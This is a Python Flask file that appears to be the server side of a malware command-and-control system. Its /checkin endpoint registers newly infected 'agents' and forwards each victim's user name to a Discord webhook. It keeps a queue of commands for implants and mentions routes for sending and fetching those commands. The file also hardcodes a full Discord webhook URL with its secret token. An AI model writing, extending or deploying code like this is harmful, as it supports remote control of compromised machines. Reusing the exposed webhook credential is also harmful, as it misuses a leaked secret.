import requests
from flask import Flask, request, jsonify

app = Flask(__name__)
command_queue = []

# Replace with your actual Discord Webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1483772058558136452/l8maf6eEPYKlDuVF-j64lXjUYF8P3a9Lgq4ixjJpvbmHKsgJdgMs3_F8rkp-eurIelnw"

@app.route('/checkin', methods=['POST'])
def checkin():
    data = request.json
    user = data.get('user', 'Unknown User')
    
    # NEW: Log this to Railway logs so we know the request arrived
    print(f"DEBUG: Check-in received from {user}. Attempting to send to Discord...")
    
    message = {"content": f"!!! NEW AGENT FOUND: {user} !!!"}
    
    try:
        response = requests.post(WEBHOOK_URL, json=message)
        # NEW: Log the response from Discord to see if it liked our request
        print(f"DEBUG: Discord response status: {response.status_code}")
    except Exception as e:
        print(f"DEBUG: Webhook failed with error: {e}")
        
    return jsonify({"status": "acknowledged"}), 200

# ... (rest of your existing code: /send_command, /get_command)
